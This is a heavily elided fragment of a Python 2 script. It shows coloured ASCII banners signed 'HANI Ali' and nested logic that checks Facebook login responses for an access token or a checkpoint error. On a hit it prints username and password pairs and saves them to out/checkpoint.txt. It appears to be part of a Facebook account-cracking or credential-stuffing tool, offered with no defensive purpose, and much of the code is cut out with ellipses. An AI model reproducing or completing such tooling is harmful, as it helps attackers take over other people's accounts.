...
\033[1;97m║╔╗║╠╣║║║╠║║╗
\033[1;96m╚╝╚╩╝╚╩╩═╩══╝
\033[1;96m:•◈•  HANI     2 0 2 1    ALi  
\033[1;97m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;94mHANI2021Ali\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mHani Ali \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
...
\033[1;96m───────────────────╚═╝
\033[1;96m🇸🇾🇸🇾🇸🇾HANI💜Ali🇵🇸🇵🇸🇵🇸
\033[1;96m •◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mHANI2020\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"""
jalan("\033[1;96m──────────────────────────")
							...
							if 'access_token' in q:
								...
								if 'www.facebook.com' in q["error_msg"]:
									...
									if 'access_token' in q:
										...
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;96mhani×\x1b[1;97m-\x1b[1;96m \x1b[1;97m-' + user + '-\x1b[1;96m \x1b[1;97m-' + pass4
											cek = open("out/checkpoint.txt", "a")
